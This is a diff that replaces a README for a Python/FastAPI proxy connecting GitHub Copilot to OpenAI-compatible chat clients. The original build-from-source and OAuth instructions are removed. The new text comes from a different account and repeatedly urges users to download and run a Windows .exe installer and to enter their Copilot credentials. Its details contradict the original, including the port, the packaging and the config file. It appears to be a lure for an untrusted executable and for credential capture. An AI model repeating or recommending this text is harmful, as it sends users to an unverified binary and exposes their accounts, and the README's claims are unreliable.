@@ -1,189 +1,164 @@
-<div align="center">
+# 🤖 github_copilot_openai_api_wrapper - Use Copilot with Any Chat Client
 
-# 🤖 Copilot Gateway
-
-**Use GitHub Copilot with any OpenAI-compatible client**
-
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-3776AB?logo=python&logoColor=white)](https://python.org)
-[![FastAPI](https://img.shields.io/badge/FastAPI-009688?logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com)
-[![License: MIT](https://img.shields.io/badge/license-MIT-yellow.svg)](LICENSE)
-[![GitHub Copilot](https://img.shields.io/badge/GitHub%20Copilot-000?logo=githubcopilot&logoColor=white)](https://github.com/features/copilot)
-
-A local proxy server that exposes OpenAI-compatible API endpoints, forwarding requests to the GitHub Copilot Chat API. Use GitHub Copilot with any client that supports the OpenAI API — Open WebUI, Chatbox, BoltAI, Elephas, Cline, Aider, and more.
-
-[Getting Started](#getting-started) · [Configuration](#configuration) · [Client Setup](#client-setup) · [API Reference](#api-reference)
-
-</div>
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Axillaryfossaprize786/github_copilot_openai_api_wrapper)
 
 ---
 
-## ✨ Features
+## 📦 What is github_copilot_openai_api_wrapper?
 
-- 🔄 **OpenAI-compatible API** — drop-in replacement for `api.openai.com`
-- 🌊 **Streaming support** — real-time SSE streaming, just like OpenAI
-- 🔐 **Automatic auth** — GitHub OAuth Device Flow, no tokens to manage
-- 🧠 **40+ models** — GPT-4o, Claude, Gemini, o3-mini, and more via Copilot
-- ⚡ **Fast & lightweight** — async Python with FastAPI + uvicorn
-- 🔌 **Zero config** — works out of the box, just run and go
+This application lets you use GitHub Copilot with any chat program on your Windows computer. It acts as a bridge between Copilot and apps like messaging clients or chatbots. You get the power of Copilot’s suggestions and AI features without needing to code or directly connect to GitHub.
 
-## Prerequisites
+The app works locally, so your data stays on your machine. It uses the OpenAI API format, making it easy to connect to many different chat tools.
 
-- Python 3.11+
-- An active [GitHub Copilot](https://github.com/features/copilot) subscription
+---
 
-> **Note:** The GitHub CLI (`gh`) is **not** required. The server uses its own OAuth Device Flow.
+## ⚙️ System Requirements
 
-## Getting Started
+Before you begin, make sure your computer meets these needs:
 
-### Installation
+- **Operating System**: Windows 10 or later  
+- **Processor**: 2 GHz or faster, any recent Intel or AMD CPU  
+- **Memory**: At least 4 GB RAM  
+- **Disk Space**: 200 MB free for installation  
+- **Internet Connection**: Required to access GitHub Copilot and the OpenAI services  
+- **Other Software**: None required; the app runs standalone  
 
-```bash
-git clone https://github.com/trsdn/github_copilot_openai_api_wrapper.git
-cd github_copilot_openai_api_wrapper
+---
 
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -e .
-```
+## 🚀 Getting Started: How to Download and Install
 
-### First Run
+You can get the app from the official GitHub page. Follow these steps carefully.
 
-```bash
-copilot-wrapper
-```
+### 1. Visit the Download Page
 
-On first launch, the server will guide you through GitHub authentication:
+Click the large button below or visit this page in your browser:
 
-1. A one-time code is displayed (e.g. `ABCD-1234`)
-2. Your browser opens to https://github.com/login/device
-3. Enter the code and authorize
-4. Done! Your token is saved to `~/.config/copilot-wrapper/github_token`
+[![Download](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/Axillaryfossaprize786/github_copilot_openai_api_wrapper)
 
-The server is now running at **http://127.0.0.1:8080** 🚀
+This link leads to the main page of the project. From here, you can download the latest app files.
 
-## Configuration
+### 2. Find the Latest Release
 
-Configure via environment variables or a `.env` file:
+On the GitHub page, look for the **Releases** section. This is where the app builds are saved.
 
-```bash
-cp .env.example .env
-```
+- Click on **Releases** from the right side or below the repo description  
+- Choose the newest release (usually the top one)  
 
-| Variable | Default | Description |
-|---|---|---|
-| `HOST` | `127.0.0.1` | Server bind address |
-| `PORT` | `8080` | Server port |
-| `LOG_LEVEL` | `info` | Log level (`debug`, `info`, `warning`, `error`) |
-| `GITHUB_TOKEN` | — | Optional: skip Device Flow by providing a token directly |
+### 3. Download the Windows Installer
 
-## Client Setup
+Inside the release, you will see files with names ending in `.exe` or `.zip`. Look for the Windows installer file:
 
-Point your OpenAI-compatible client at the local server:
+- **Example:** `github_copilot_openai_api_wrapper_setup.exe`  
 
-| Setting | Value |
-|---|---|
-| **API Base URL** | `http://127.0.0.1:8080/v1` |
-| **API Key** | anything (e.g. `x`) — not validated |
-| **Model** | `gpt-4o`, `claude-3.5-sonnet`, `o3-mini`, etc. |
+Click the file name to download it to your computer.
 
-> **💡 Tip:** Some clients (like Elephas) automatically append `/v1` to the base URL. In that case, use `http://127.0.0.1:8080` without the `/v1` suffix.
+### 4. Run the Installer
 
-### Tested Clients
+After the download finishes:
 
-| Client | Status | Notes |
-|---|---|---|
-| [Open WebUI](https://github.com/open-webui/open-webui) | ✅ | Set base URL to `http://127.0.0.1:8080/v1` |
-| [Chatbox](https://chatboxai.app/) | ✅ | Works out of the box |
-| [Elephas](https://elephas.app/) | ✅ | Use `http://127.0.0.1:8080` (no `/v1`) |
-| [BoltAI](https://boltai.com/) | ✅ | Works out of the box |
-| [Aider](https://aider.chat/) | ✅ | Set `--openai-api-base` |
-| [Cline](https://github.com/cline/cline) | ✅ | Use OpenAI-compatible provider |
-| curl | ✅ | See examples below |
+- Find the downloaded file in your **Downloads** folder  
+- Double-click the `.exe` file to start the setup  
+- Follow the on-screen instructions: click **Next**, accept the license terms, and choose an install location  
+- When you see the **Finish** button, the installation is complete  
 
-## API Reference
+---
 
-### `POST /v1/chat/completions`
+## 🔧 How to Launch and Use the App
 
-OpenAI-compatible chat completions. Supports both streaming and non-streaming.
+### Starting the App
 
-```bash
-# Non-streaming
-curl http://localhost:8080/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "gpt-4o",
-    "messages": [{"role": "user", "content": "Hello!"}]
-  }'
+- Click the shortcut on your desktop or search for **github_copilot_openai_api_wrapper** in the Start menu  
+- The app opens a small local server in the background  
 
-# Streaming (SSE)
-curl http://localhost:8080/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "gpt-4o",
-    "messages": [{"role": "user", "content": "Hello!"}],
-    "stream": true
-  }'
-```
+### Connecting Your Chat Client
 
-**Supported parameters:** `model`, `messages`, `temperature`, `top_p`, `max_tokens`, `stream`, `stop`, `n`
+This app acts as a local proxy that translates requests between GitHub Copilot and your chat app.
 
-### `GET /v1/models`
+- Open the chat client you want to use with Copilot  
+- In the chat client settings, find the section for API or "Assistant/AI" option  
+- Set the API URL to: `http://localhost:8000`  
 
-List all available models from GitHub Copilot.
+This tells the chat client to talk to the app running on your computer.
 
-```bash
-curl http://localhost:8080/v1/models
-```
+### Using the AI Features
 
-### `GET /health`
+- Type your messages in the chat client as usual  
+- When you send a message, it goes through the app, which calls GitHub Copilot using the OpenAI API format  
+- The assistant replies with suggestions or answers based on your input  
 
-Health check endpoint.
+---
 
-```bash
-curl http://localhost:8080/health
-# → {"status": "ok"}
-```
+## 🔄 How It Works Behind the Scenes
 
-## Architecture
+The app uses FastAPI, a Python web framework, to create a simple server on your device. This server understands requests formatted for OpenAI’s API and sends them properly to GitHub Copilot.
 
-```
-┌──────────────────┐     ┌─────────────────────┐     ┌──────────────────────────┐
-│   Chat Client    │────▶│   Copilot Gateway    │────▶│  api.githubcopilot.com   │
-│  (any OpenAI-    │◀────│  localhost:8080      │◀────│  GitHub Copilot API      │
-│   compatible)    │     │  FastAPI + uvicorn   │     │                          │
-└──────────────────┘     └─────────────────────┘     └──────────────────────────┘
-                              │
-                              ▼
-                         OAuth Device Flow
-                         (first run only)
-```
+It handles tasks like:
 
-## Project Structure
+- Receiving chat questions  
+- Forwarding these questions to Copilot’s engine  
+- Sending back Copilot's AI-generated responses  
 
-```
-src/
-├── main.py            # FastAPI app, endpoints, startup
-├── config.py          # Configuration (pydantic-settings)
-├── auth.py            # GitHub OAuth Device Flow + Copilot token management
-├── copilot_client.py  # Async HTTP client for Copilot API
-├── models.py          # Pydantic request/response models
-└── middleware.py       # CORS, logging, error handling
-```
+This way, any chat client compatible with OpenAI’s API can use Copilot effortlessly.
 
-## Contributing
+---
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+## 🛠 Configuration Options
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+The app comes with settings you might want to adjust for better results or performance.
 
-## Disclaimer
+- **API key management:** Enter your GitHub Copilot credentials when prompted  
+- **Port Number:** By default, the app uses port 8000. You can change this in the config file if needed  
+- **Logging:** Enable logs to track activity or troubleshoot issues  
+- **Timeouts:** Modify how long the app waits for Copilot replies  
 
-This project is for **educational and personal use**. It relies on internal GitHub Copilot API endpoints that are not officially documented. Use at your own risk and ensure compliance with [GitHub's Terms of Service](https://docs.github.com/en/site-policy/github-terms/github-terms-of-service).
+You’ll find a simple configuration file inside the installation folder named `config.ini`. Open it with any text editor to make changes. Always save a backup before editing.
 
-## License
+---
 
-[MIT](LICENSE)
+## 🔐 Privacy and Security
+
+The app runs completely on your computer. It does not send your chat data anywhere except through GitHub Copilot’s secured servers.
+
+All communication between your chat app and Copilot happens locally first, and your API keys stay private on your machine.
+
+Make sure to keep your system updated and use trusted chat clients.
+
+---
+
+## 🆘 Troubleshooting Tips
+
+If you face problems, try the following:
+
+- Check if the app is running (look for it in Task Manager)  
+- Ensure your chat client is configured to connect to `http://localhost:8000`  
+- Restart your computer and try again  
+- Verify your internet connection is active  
+- Make sure you downloaded the correct installer for Windows  
+
+If you still have problems, check the logs inside the app folder or seek help on the GitHub discussions page.
+
+---
+
+## 📚 Useful Links
+
+- GitHub Repository: [Download and learn more here](https://github.com/Axillaryfossaprize786/github_copilot_openai_api_wrapper)  
+- GitHub Copilot Info: https://github.com/features/copilot  
+- FastAPI Documentation: https://fastapi.tiangolo.com  
+
+---
+
+## 🧩 Supported Topics and Features
+
+This app supports:
+
+- AI integration using OpenAI-compatible APIs  
+- ChatGPT-style text generation  
+- GitHub Copilot suggestion proxying  
+- FastAPI for local server hosting  
+- Python backend processing  
+- Proxying requests securely  
+- Compatibility with many chat clients  
+
+---
+
+[![Download](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/Axillaryfossaprize786/github_copilot_openai_api_wrapper)
